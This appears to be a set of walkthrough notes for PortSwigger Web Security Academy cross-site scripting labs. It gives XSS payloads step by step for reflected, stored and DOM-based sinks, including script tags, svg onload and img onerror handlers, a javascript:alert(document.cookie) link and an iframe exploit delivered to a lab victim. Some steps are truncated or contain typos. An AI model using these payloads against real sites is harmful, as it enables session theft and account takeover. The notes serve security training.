
To solve this lab we type

`<script>alert('hello world')</script>`

 in the search bar



**Step1**

Click on view post

**Step2**

Leave a  alert script as a comment


Post the comment

And lab will be solve.

Now when we again view the same post it show alert message.

**Step1**

First we see what is document.write

The document.write() method writes a string of text to a document stream opened by document.open()

**Example**
```
    <script>  
               functionnewContent(){

                         document.open();

                         document.write("<h1>Out with the old, in with the new!</h1>");

                         document.close();

                   }

     </script>
```
Then we see what is location.search

The search property of the Location interface is a search string, also called a query string; that is, a string containing a '?' followed by the parameters of the URL.

**Code Example**

`.html code`

`<a id="myAnchor" href="/en-US/docs/Location.search?q=123">Link</a>`

Corresponding `.js `code
```
const anchor = document.getElementById("myAnchor");

const queryString = anchor.search; // Returns:'?q=123'

// Further parsing:

const params = new URLSearchParams(queryString);

const q = parseInt(params.get("q")); // is the number 123
```

Now we try to use this knowledge to solve this lab

Now
```
<script>  
letuserInput = "<svg onload=alert(1)>";  
document.write(userInput);  
</script>
```

And lab will solve


**Or alternative**

`"><svg onload=alert(1)>`


**Step 1**

Write any text in search bar

In developer we can see problem is in inner HTML


**Step2:**

Now we try to use this exploit that show alert on error.

`<img src=1 href=1 onerror="javascript:alert(1)"></img>`

There are a lot of exploits available on this repositories

[https://github.com/payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list)

As we are triggering an error message so these exploit also work
```
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>  
<video src=1 href=1 onerror="javascript:alert(1)"></video>  
<image src=1 href=1 onerror="javascript:alert(1)"></image>

<img src=1 onerror=alert(1)>
```

**Step1**

We go to feedback page we see in url

So it is taking a returnpath

**Step2:** 

first we inspect page
  
from this it is very clear that the script set the href attribute that is paste in URL.

Like

`<a id=""backlink" href="/userinput">Back</a>`

**Step3:**

So we use

`<a id=""backlink" href="javascript:alert(document.cookie)">Back</a>`

For this we remove / and type

`javascript:alert(document.cookie)`

Now click enter and press back button inline with submit button

Point:The syntax `javascript:function()` is typically used when creating and executing a JavaScript function directly from the browser's address bar or from a JavaScript-enabled environment where you can execute JavaScript code directly.

**Step1:**

First we view page source code

Here we have a javascript code that show to move to next post based on heading of post.

**Step2:**

Now we check is it working or not. For this we use

We have h2 heading "Awkward Breakups"

#h2 in URL.

Because this script will remove # from start.



And its working

**Step3:**  

Now we go to console and check the result

Press `ctrl+shift+c`

From the result this is clear that the hash sign is remove and then URL encoded

Then the input is then decoded

**Step4:**

After searching on internet I come to this link

[https://security.stackexchange.com/questions/177261/is-xss-possible-with-jquerylocation-hash](https://security.stackexchange.com/questions/177261/is-xss-possible-with-jquerylocation-hash)

Here I found this information


`#p=<img src%3D/%20onerror%3Dalert(1)>`

When I try this payload it show alert

So now we try to print

`#p=<img src%3D/%20onerror%3Dprint(1)>`

And its working


**Step5**

Now we send this to victim

`<iframe src="https://0a43000f0447eac082472953006500a0.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`

And deliver it to victim


**Step1:**

To solve this first we try with simple payload and see result

When we try to close tag using ">

Its not working because it is reading ">  as string

**Step2:**

Now we try this payload

As we see source code is

To make it complete look

	<input type="text" value=""><script>alert(document.domain)</script>" autofocus onfocus=alert('XSS') x="">`

So our payload look like

`"><script>alert(document.domain)</script>" autofocus onfocus=alert('XSS') x="">`

And the lab will solve


This lab will also solve using this payload

**Step3:**

This lab can also solve using

Replace your input with the following payload to escape the quoted attribute and inject an event handler:  
`"onmouseover="alert(1)`


**Step1**

First we write a comment in any post


And intercept the request in burp proxy

**Step2:**

Send the request to repeater and make change the websitename to


**Step3**

- nd it

- follow redirection

**Step4:**

Now when we go to comment and click on a post it show alert message


**Step1:**

First we view page source

**Step2:**

After viewing the source code

We try this exploit

`'; alert(1); //`

Or we use

`'-alert(1)-'`
